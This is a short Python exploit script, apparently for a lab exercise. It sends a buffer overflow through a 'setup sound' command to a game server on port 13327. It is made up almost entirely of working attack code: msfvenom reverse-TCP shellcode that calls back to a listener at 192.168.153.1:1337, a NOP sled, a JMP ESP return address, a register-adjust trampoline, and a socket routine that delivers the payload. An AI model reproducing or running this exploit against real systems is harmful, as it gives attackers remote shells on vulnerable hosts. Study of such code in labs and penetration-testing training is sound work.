import socket
import os
import sys

offset = 4368
padding_nop = b"\x90" * 16

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.153.1 LPORT=1337 -b "\x00\x20" -f c

shell = (b"\xbd\xcb\xf3\x66\x8e\xda\xc0\xd9\x74\x24\xf4\x58\x2b\xc9"
         b"\xb1\x12\x31\x68\x12\x83\xc0\x04\x03\xa3\xfd\x84\x7b\x02"
         b"\xd9\xbe\x67\x37\x9e\x13\x02\xb5\xa9\x75\x62\xdf\x64\xf5"
         b"\x10\x46\xc7\xc9\xdb\xf8\x6e\x4f\x1d\x90\xb0\x07\x44\x61"
         b"\x59\x5a\x77\x64\xa0\xd3\x96\xd6\xb4\xb3\x09\x45\x8a\x37"
         b"\x23\x88\x21\xb7\x61\x22\xd4\x97\xf6\xda\x40\xc7\xd7\x78"
         b"\xf8\x9e\xcb\x2e\xa9\x29\xea\x7e\x46\xe7\x6d")

# bad_chars="\x00\x20"
# jmpeax="08071e4e"
# jmpesp="08134596"
# add_eax_12="83C00C"
# jmp_eax="FFE0"


jmpesp_little_endian = b"\x96\x45\x13\x08"
add_eax_12_plus_jmp_eax = b"\x83\xC0\x0C\xFF\xE0"






Manipulte = padding_nop * 100 + shell + b"\x90" * (4368-100*16 - len(shell)) + jmpesp_little_endian + add_eax_12_plus_jmp_eax + b"\x90\x90"
print(len(Manipulte)) #4379


data = b"\x11(setup sound " + Manipulte + b"\x90\x00#"


expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.153.130", 13327))
expl.settimeout(5)
print(expl.recv(1024))
expl.send(data)
expl.close()
